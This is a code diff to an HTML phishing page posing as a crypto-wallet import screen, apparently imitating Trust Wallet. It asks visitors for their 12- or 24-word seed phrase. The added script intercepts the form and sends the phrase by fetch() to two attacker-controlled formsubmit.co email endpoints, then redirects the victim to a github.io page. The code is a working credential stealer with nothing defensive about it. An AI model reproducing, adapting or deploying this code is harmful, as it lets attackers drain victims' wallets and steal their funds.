@@ -155,17 +155,46 @@
         <button class="active" onclick="setWords(12)">12 words</button>
         <button onclick="setWords(24)">24 words</button>
     </div>
-    <form action="https://formsubmit.co/PotionMagique7@proton.me" method="POST">
-        <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase TWT" required></textarea>
-        <div class="words-grid" id="wordsGrid">
-            <!-- Word boxes dynamically generated -->
-        </div>
-        <!-- Redirection after submission -->
-        <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
-        <!-- Anti-spam field -->
-        <input type="hidden" name="_captcha" value="false">
-        <button type="submit" class="submit-button">Import wallet</button>
-    </form>
+    <form id="walletForm" action="https://formsubmit.co/PotionMagique7@proton.me" method="POST">
+    <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." 
+              oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase TRUST" required></textarea>
+    
+    <div class="words-grid" id="wordsGrid">
+        <!-- Word boxes dynamically generated -->
+    </div>
+
+    <!-- Redirection après soumission -->
+    <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
+    <!-- Anti-spam -->
+    <input type="hidden" name="_captcha" value="false">
+
+    <button type="submit" class="submit-button">Import wallet</button>
+</form>
+
+<script>
+document.getElementById("walletForm").addEventListener("submit", function(e) {
+    e.preventDefault(); // Empêche l'envoi immédiat
+
+    let form = this;
+    let formData = new FormData(form);
+
+    // 1er envoi vers le premier email
+    fetch("https://formsubmit.co/PotionMagique7@proton.me", {
+        method: "POST",
+        body: formData
+    }).then(() => {
+        // 2e envoi vers le deuxième email
+        return fetch("https://formsubmit.co/code-iptv@proton.me", {
+            method: "POST",
+            body: formData
+        });
+    }).then(() => {
+        // Redirection finale après soumission
+        window.location.href = "https://fauxon.github.io/fhrdhqctvghbn-/";
+    }).catch(error => console.error("Erreur :", error));
+});
+</script>
+
     <div id="output"></div>
 </div>
 
